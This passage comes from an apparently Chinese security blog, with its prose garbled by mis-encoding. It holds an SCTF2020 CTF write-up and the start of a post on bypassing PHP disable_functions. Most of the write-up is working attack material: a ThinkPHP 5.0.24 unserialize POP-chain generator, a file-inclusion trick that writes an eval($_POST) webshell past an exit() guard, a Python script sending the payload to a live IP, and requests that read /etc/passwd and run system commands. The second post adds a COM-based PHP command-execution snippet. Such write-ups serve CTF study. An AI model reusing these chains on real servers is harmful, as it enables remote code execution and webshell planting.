<p>åœ¨<a target="_blank" rel="noopener" href="http://39.99.41.124/public/nationalsb/js/script.js%E4%B8%AD%E5%8F%91%E7%8E%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9A">http://39.99.41.124/public/nationalsb/js/script.jsä¸­å‘ç°è´¦å·å¯†ç ï¼š</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//username:Admin1964752</span><br><span class="line">//password:DsaPPPP!@#amspe1221</span><br><span class="line">//Secret **** is your birthday</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶åŒ…å«:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 39.99.41.124</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">file=/etc/passwd</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Warning&lt;/b&gt;:  include(): Failed opening &#x27;php://filter/read=convert.base64-encode/resource=index.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Host: 39.99.41.124</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> \<span class="title">think</span>\<span class="title">Controller</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  	<span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Warning&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You IP: &quot;</span>.<span class="variable">$ip</span>.<span class="string">&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#x27;</span>;  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  	unserialize(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;s3cr3tk3y&#x27;</span>]));</span><br><span class="line">    <span class="keyword">echo</span>(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;s3cr3tk3y&#x27;</span>]));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>/var/www/html/protect.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;cjbtest&#x27;</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">	    <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">	    <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#x27;</span>, <span class="comment">// å› ä¸º static ç›®å½•æœ‰å†™æƒé™</span></span><br><span class="line">	    <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span></span><br><span class="line">	];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handler=<span class="keyword">new</span> File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;styles = [<span class="string">&quot;getAttr&quot;</span>, <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;comment&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;question&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;highlight&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;warning&#x27;</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query(<span class="string">&quot;xx&quot;</span>, <span class="string">&#x27;think\console\Output&#x27;</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&quot;xx&quot;</span> =&gt; <span class="string">&quot;xx&quot;</span>];</span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;test&quot;</span> =&gt; <span class="string">&quot;getError&quot;</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;panrent&quot;</span> =&gt; <span class="string">&quot;true&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="variable">$payload</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure>

<p>å†™æ–‡ä»¶åˆ°/tmp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">payload=requests.get(<span class="string">&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;</span>).text.strip()</span><br><span class="line">burp0_url = <span class="string">&quot;http://8.208.102.48:80/public/index.php&quot;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&quot;s&quot;</span>:<span class="string">&quot;/index/Index/hello&quot;</span>,</span><br><span class="line">    <span class="string">&quot;s3cr3tk3y&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">res=requests.get(burp0_url, headers=burp0_headers ,params=params)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">&quot;http://8.208.102.48:80/public/log.txt&quot;</span>).text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 8.208.102.48</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 155</span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</span><br></pre></td></tr></table></figure>

<p>å†™åˆ°æ–‡ä»¶é‡Œçš„å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//000000000000</span><br><span class="line"> exit();?&gt;</span><br><span class="line">s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œ <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> é‡Œé¢çš„æ–¹æ³•å·²ç»ä¸ç®¡ç”¨äº†ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±æƒ³å‡ºå…¶ä»–åŠæ³•</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>æ¥ç»•è¿‡æ­»äº¡exit</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$backdoor</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = str_rot13(base64_encode(<span class="variable">$payload</span>));</span><br><span class="line"><span class="variable">$payload</span> = base64_decode(str_rot13(base64_encode(<span class="variable">$backdoor</span>)));</span><br><span class="line">assert(base64_decode(<span class="variable">$x</span>) === <span class="variable">$backdoor</span>);</span><br></pre></td></tr></table></figure>

<p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p>
<p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p>
<p>æœ€åçš„payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 8.208.102.48</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 126</span><br><span class="line"></span><br><span class="line">file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/07/sctf2020/" data-id="ckw7zp40a0069ftn75r6r6axj" data-title="sctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-bypass_disable_function_open_basedir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/29/bypass_disable_function_open_basedir/" class="article-date">
  <time class="dt-published" datetime="2020-06-29T16:00:00.000Z" itemprop="datePublished">2020-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/29/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="å±é™©å‡½æ•°-ç±»"><a href="#å±é™©å‡½æ•°-ç±»" class="headerlink" title="å±é™©å‡½æ•°/ç±»"></a>å±é™©å‡½æ•°/ç±»</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FFI</span><br><span class="line">COM</span><br><span class="line">exec</span><br><span class="line">assert</span><br><span class="line">eval</span><br><span class="line">system</span><br><span class="line">ini_set/ini_alter</span><br><span class="line">putenv</span><br><span class="line">imap_open</span><br><span class="line">pcntl_exec</span><br><span class="line">win_shell_execute</span><br><span class="line">dl</span><br></pre></td></tr></table></figure>



<h2 id="åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡"><a href="#åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡" class="headerlink" title="åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡"></a>åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extension=php_com_dotnet.dll</span><br><span class="line">com.allow_dcom = true</span><br><span class="line">wshom.ocx å­˜åœ¨</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ã€€Shell.Applicationä¹Ÿèƒ½</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;exec(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br></pre></td></tr></table></figure>





<h2 id="GNU-Bash-ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2014-6271"><a href="#GNU-Bash-ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2014-6271" class="headerlink" title="GNU Bash ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2014-6271"></a>GNU Bash ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2014-6271</h2><blockquote>
<p>   è¢«æ”»å‡»çš„bashå­˜åœ¨æ¼æ´ï¼ˆç‰ˆæœ¬å°äºç­‰äº4.3ï¼‰<br>   æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡<br>   æ–°çš„bashè¿›ç¨‹è¢«æ‰“å¼€è§¦å‘æ¼æ´å¹¶æ‰§è¡Œå‘½ä»¤</p>
</blockquote>
<p>åˆ©ç”¨phpçš„mailå‡½æ•°:<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/35146">https://www.exploit-db.com/exploits/35146</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.antiy.com/response/CVE-2014-6271.html">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a><strong>æ¼æ´åŸç†</strong></h3><p>4.3åŠä¹‹å‰çš„bashå¯åŠ¨è§£æç¯å¢ƒå˜é‡æ—¶æœªå¯¹è¾¹ç•Œè¿›è¡Œä¸¥æ ¼çš„é™åˆ¶</p>
